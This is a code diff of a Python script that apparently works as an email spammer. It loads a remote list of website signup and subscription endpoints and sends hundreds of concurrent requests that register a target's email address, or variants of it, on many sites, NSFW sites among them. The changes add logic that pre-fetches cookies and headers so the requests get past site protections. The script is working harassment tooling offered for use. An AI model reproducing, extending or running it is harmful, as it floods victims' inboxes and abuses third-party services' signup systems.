@@ -1,50 +1,30 @@
-# ███╗   ██╗ ██████╗ ████████╗███████╗███████╗
-# ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝██╔════╝
-# ██╔██╗ ██║██║   ██║   ██║   █████╗  ███████╗
-# ██║╚██╗██║██║   ██║   ██║   ██╔══╝  ╚════██║
-# ██║ ╚████║╚██████╔╝   ██║   ███████╗███████║
-# ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝
-# What Ive Worked On:
-# removed the discord webhook logging feature for the moment
-# New menu / "Frontend" UI :3 + credits etc
+# Notes to self:
+# The title bar still isnt working on arch linux and causes .json errors
+# Need to work on multi-threading when it comes to running the process
+# Adding more logging for the websites when it comes to the errors etc. like the 404, 403, api errors etc
+# Gonna push this to the github later today
+
 
 import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle, fade, sys, colorama, threading, requests, trio
 from pystyle import Center
 from colorama import Fore, Style, init
-
-try:
-    import requests
-    import aiohttp
-    import pystyle
-    import fade
-    import colorama
-    import trio
-
-except ModuleNotFoundError as e:
-    missing_module = str(e).split("'")[1]
-    os.system(f"pip install {missing_module}")
-    print(f"Installed {missing_module}, restarting script...")
-    os.execv(sys.executable, ["python"] + sys.argv)
+from pathlib import Path
 
 size = 600  # Threads + Process / Iterations
-cap = None  # thread limit / set to None for unlimited. Only go higher than 500 is u got a fucking beast of a pc CPU wise.
-random_threads = True  # True = Threads Random. False = They Arent Random
-include_nsfw_sites = True  # True = Include NSFW sites. False = No NSFW sites
-include_special_characters = True # added if u want to include special characters for the password when ur sending the api requests
+cap = None  # thread cap
+random_threads = True  # randomises
+include_nsfw_sites = True  
+include_special_characters = True 
+
 timeout = aiohttp.ClientTimeout(total=20)
 init(autoreset=True)
-
 
 def restart_main():
     asyncio.run(main())
 
-
 def clear_console():
     os.system("cls" if os.name == "nt" else "clear")
 
-
-# thank you c++ to python converter :fire:
-# i didnt wanna write that all again personally
 def update_title():
     while True:
         title = "[t.me/influenceable]" + "".join(
@@ -56,23 +36,16 @@ def update_title():
         os.system(
             f"title {title}" if os.name == "nt" else f"\033]0;{title}\007"
         )
-        time.sleep(0.2)
+        time.sleep(0.3)
 
-
-# why the fuck did i have it repeating the clear_console() function and then making it sleep for .5 of a second
-# gotta love 3 in the morning code
 def credit():
     clear_console()
     print(Center.XCenter(faded_credits))
     time.sleep(5)
 
-    # skidded from chatgpt
-
-
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
-
     funnylimit = 5000
 
     for i in range(1, len(username)):
@@ -101,25 +74,19 @@ def generate(length: int = 5):
         ba[i] = ord("a") + b % 26
     return str(time.time()).replace(".", "") + ba.decode("ascii")
 
-
 def validate_email(email):
     return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)
-
 
 def is_html_string(text: str) -> bool:
     return bool(re.compile(r"<[^>]+>").search(text))
 
-
 def clamp(value, min_value, max_value):
     return max(min_value, min(value, max_value))
-
 
 def divide():
     print("-" * 40)
 
-
 progress = 0
-
 
 def update_progress():
     global progress
@@ -145,45 +112,63 @@ async def fetch(
     sub: str,
     info,
     name: str = None,
-    testing: bool = False,
+    debugging: bool = False
 ):
+    replacements = {}
     def fix(lol):
         try:
             required = isinstance(lol, (dict, tuple, list))
-            result = json.dumps(lol) if required else lol
-            result = (
-                result.replace("{email}", sub)
-                .replace("{password}", password)
-                .replace("{random}", generate())
-                .replace("{username}", generate())
-                .replace(
-                    "{frenchnumber}",
-                    str(random.randint(100_000_000, 999_999_999)).replace(
-                        "{timestamp}", str(int(time.time()))
-                    ),
-                )
-            )
-            result = json.loads(result) if required else result
+            result = (required and json.dumps(lol)) or lol
+            result = result.replace("{email}", sub).replace("{password}", password).replace("{random}", generate()).replace("{username}", generate()).replace("{timestamp}", str(int(time.time())))
+            for k, v in replacements.items():
+                print(k, v)
+                result = result.replace(k, v)
+            result = (required and json.loads(result)) or result
         except Exception:
             import traceback
-
             print(traceback.format_exc())
         return result
 
     try:
+        # asdf
+
+        requirements = info.get("requirements")
+        if requirements:
+            for thing in requirements:
+                async with session.request(
+                    method=thing.get("method", "GET"),
+                    url=thing.get("url"),
+                    headers=info.get("headers")
+                ) as resp:
+                    for cookie in thing.get("cookies", []):
+                        replacements[cookie.get("name")] = resp.cookies.get(cookie.get("key")).value
+                    for header in thing.get("headers", []):
+                        replacements[header.get("name")] = resp.headers.get(header.get("key"))
+
+        print(requirements)
+
+        # asdf
         url = fix(info.get("url"))
         method = info.get("method", "POST").upper()
-        js = info.get("json", None)
+        js = info.get("json")
         if js is not None:
             js = fix(js)
-        data = info.get("data", None)
+        data = info.get("data")
         if data is not None:
             data = fix(data)
-        params = info.get("params", None)
+        params = info.get("params")
         if params is not None:
             params = fix(params)
-        headers = info.get("headers", None)
-        cookies = info.get("cookies", None)
+        headers = info.get("headers", {})
+        cookies = info.get("cookies", {})
+        
+        if debugging == True:
+            print("json:", js)
+            print("data:", data)
+            print("params:", params)
+            print("headers:", headers)
+            print("cookies:", cookies)
+
         async with session.request(
             method=method,
             url=url,
@@ -229,7 +214,7 @@ async def fetch(
                         "An account using this email address has already been registered.",
                         "Permission Denied",
                     ]
-                    if any([word in evaluation.lower() for word in words]):
+                    if any([word in resp.lower() for word in words]):
                         evaluation = "FAILURE"
                         status = 400
                 resp = (
@@ -312,18 +297,16 @@ def menu():
     return choice
 
 
-# banners
 faded_text = fade.purpleblue(text)
 faded_credits = fade.purpleblue(credits)
 
-# ui colours
 yellow_dash = f"{Fore.YELLOW}-{Style.RESET_ALL}"
 red_dash = f"{Fore.RED}-{Style.RESET_ALL}"
 green_dash = f"{Fore.GREEN}-{Style.RESET_ALL}"
 blue_dash = f"{Fore.BLUE}-{Style.RESET_ALL}"
 
 
-async def main():
+async def main(): 
     clear_console()
     print(Center.XCenter(faded_text))
     try:
@@ -340,7 +323,7 @@ async def main():
                 clear_console()
                 print(Center.XCenter(faded_text))
                 print(f"\r[{yellow_dash}] Connecting now...")
-                time.sleep(3)
+                time.sleep(1)
                 async with session.get(
                     "https://rawcdn.githack.com/Inkthirsty/Email-Spammer/ce70ff9a875692f37d7fca5aedae2db7e93c1f11/functions.json"  # changed to
                 ) as resp:
@@ -373,12 +356,14 @@ async def main():
             ]
 
             if include_special_characters:
-                samples.append(string.punctuation) # makes special characters a true or false statement
+                samples.append(
+                    string.punctuation
+                ) 
 
             for sample in samples:
                 password += "".join(random.sample(sample, k=5))
 
-            password = "!" + "".join(random.sample(password, k=len(password))) 
+            password = "!" + "".join(random.sample(password, k=len(password)))
 
             email = None
             while True:
@@ -458,7 +443,7 @@ async def main():
                 )
                 test_tasks = [
                     asyncio.create_task(
-                        fetch(session, email, values, name, True)
+                        fetch(session, email, values, name, debug)
                     )
                     for name, values in functions.items()
                 ]
@@ -538,7 +523,7 @@ async def main():
             f"\r[{red_dash}] It seems like the program has died before pope francis :(( womp womp"
         )
         await asyncio.sleep(5)
-        sys.exit()
+        sys.exit()  
 
 
 if __name__ == "__main__":
